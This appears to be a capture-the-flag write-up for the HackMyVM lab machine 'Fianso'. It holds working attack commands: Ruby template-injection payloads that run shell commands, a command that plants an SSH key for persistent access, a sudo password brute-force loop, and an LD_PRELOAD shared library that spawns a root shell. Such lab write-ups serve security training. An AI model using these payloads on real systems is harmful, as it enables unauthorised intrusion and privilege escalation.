# Fianso

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.169:22
Open 10.0.2.169:8000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.169
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ee:71:f4:ad:a0:71:e1:35:19:86:ab:c8:e6:be:36:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7WSYGSeML+7fdCGSg/SceCebE64ubFkH1Lz8A+lQ0AVyfX53bRJd5tLTsioGIktkCOADunR5OnBVsYENJELoRyLBIKVOUM47PZezmL5YMTqsfmkLlrvxmxh1qIePM4BWN41WtRVj5UeVJbonyfg+XSYcOSvexW0ecjgVsZF+3L+oGHY/HVN6hVjbYCcgzjagL0+yjUUcsqsZiKJTRAwKDW/0KTzNpl6DR3+V/kI9IqtMVv1b5HiGEVGDfFG43aKBCCYN6Z5UJ9LQxzn1ek5qm+itm2HBRsx1gyP5090iWq7JaienHNu+SF5INC+0gONeDNQbGe2DmFOP4DmRVN2xab6yOtad8RUeuXV9Ai34oQ5C5Sb05359r7hIiUbmW8HUdyno0MJWzD3qMaI4vjzu8LjHBFgLLr46W85kUfGe4UNRw5oyny06dSykdlUbr5UqNqhXy0BJJ+IVAjuGRK+GJp2rG50+XtiNAl+QVmXiMPN3ZrnDH+NFNAPxx1XVulJc=
|   256 40:1c:c3:da:83:d7:2f:60:cb:12:47:3b:02:67:04:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCp+K99CwZe+fU+TRLU/qS7AhRI9WH4O/ZvweFt5WrggQF7uNqBi/CsuNuz7ZyuQhqKLY8ksBNK4Sl0zhvvuRjA=
|   256 1a:69:a7:f9:dc:a5:49:ff:d2:7d:ce:45:97:6d:8a:b9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnpl12UICtoiToIfyj1uu5B6BjKmFcThog0q8T36RAr
8000/tcp open  http    syn-ack WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (8000)

Values are reflected in HTML

![writeup.png](/assets/pentest/hackmyvm/fianso/writeup.png)

```bash
└─$ curl -i http://10.0.2.169:8000/
...
Server: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
...
```

### SSTI

- [https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Ruby/#templating-libraries](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Ruby/#templating-libraries)

```bash
Doesnt Works -> <%= 7 * 7 %>
       Works -> #{ 7 * 7 }
```

```bash
└─$ curl 'http://10.0.2.169:8000/' --data-urlencode 'name=#{ Dir.entries(".") }' -s | htmlq h2 -t
Hello [".", ".Xauthority", ".bashrc", ".config", ".local", "user.txt", ".bash_history", "..", ".bash_logout", ".profile"] !
```

```bash
└─$ curl 'http://10.0.2.169:8000/' --data-urlencode 'name=#{ `id` }' -s | htmlq h2
<h2>Hello uid=1001(sofiane) gid=1001(sofiane) groups=1001(sofiane)!</h2>
```

## SSH

Get shell access
```bash
└─$ gen_ssh_deploy
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhYSH6mNXUafS6cAysE16cakr34RsPjxDw9oXm6jjMK woyag@kraken' >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
---
└─$ curl 'http://10.0.2.169:8000/' --data-urlencode 'name=#{ `mkdir -p ~/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhYSH6mNXUafS6cAysE16cakr34RsPjxDw9oXm6jjMK woyag@kraken" >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys` }' -s | htmlq h2
```

```bash
└─$ ssh -i id_rsa sofiane@10.0.2.169
sofiane@fianso:~$ id
uid=1001(sofiane) gid=1001(sofiane) groups=1001(sofiane)
```

### User.txt

```bash
sofiane@fianso:~$ cat user.txt
dd61014e5d119683f9fc798439cd3916
```

## Privilege Escalation

```bash
sofiane@fianso:~$ sudo -l
Matching Defaults entries for sofiane on fianso:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sofiane may run the following commands on fianso:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/harness
```

```bash
sofiane@fianso:~$ ls -l /opt/harness
-rw-r--r-- 1 root root 615 Dec 24  2022 /opt/harness
sofiane@fianso:~$ cat /opt/harness
#! /bin/bash

clear -x
pass=$(</opt/passwordBox/password)
info="$(hostname):$(whoami):$pass"
conf=/opt/config.conf

#touch & chmod & echo instead echo & chmod for race condition protection from user.
touch $conf
chmod 700 $conf
echo $info >$conf

echo -e "nAuthentication to manage music collection.n"
echo -e "n$(date " Date: %D")nUser: ${info:7:4}nHost: ${info%%:*}n"

read -ep "Master's password: " passInput
if [[ $passInput == $pass ]]; then
    echo "sofiane ALL=(ALL:ALL) NOPASSWD:SETENV: /usr/bin/beet " >>/etc/sudoers
    echo -e "Sudo rights granted !n"
else
    echo -e "Wrong passwordn" && exit 1
fi
```

We can't override the config
```bash
sofiane@fianso:~$ ls -alh /opt/config.conf
-rwx------ 1 root root 43 Jan  3 10:18 /opt/config.conf
```

At first, I thought this would be easy, but then I realized that the comparison works correctly even without quotes. If it were the other way around, then `*` would have granted access (AFAIK).
```bash
if [[ $passInput == $pass ]]; then
```

### Password Bruteforce

We might actually have to bruteforce password for this script.

```bash
len(config)   = 43
len(hostname) = 6 # fianso
len(user)     = 4 # root
len(EOF)      = 1
len(delimiter)= 2
len(password) = 43 - 6 - 4 - 1 - 2 = 30
```

```bash
└─$ awk 'length($0) == 30' $rockyou > passwords.txt
└─$ scp -i id_rsa passwords.txt sofiane@10.0.2.169:/tmp
sofiane@fianso:/opt$ while read -r line; do output=$(echo $line | sudo bash /opt/harness); if [[ $output == *"Sudo rights granted"* ]]; then echo -e "Password found: $line"; exit 0; fi; done < /tmp/passwords.txt
Password found: hellnoiamnotgiveyoumypaassword
```

```bash
sofiane@fianso:~$ sudo -l
Matching Defaults entries for sofiane on fianso:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sofiane may run the following commands on fianso:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/harness
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/beet
```

### LD_PRELOAD

```bash
└─$ echo $'#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }' | gcc -fPIC -shared -o pe.so -nostartfiles -x c -
└─$ scp -i id_rsa pe.so sofiane@10.0.2.169:/tmp
---
sofiane@fianso:~$ sudo LD_PRELOAD=/tmp/pe.so beet
root@fianso:/home/sofiane# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@fianso:/home/sofiane# cat /root/root.txt
129cf8d39dad02722c0b95ddca3ad73d
```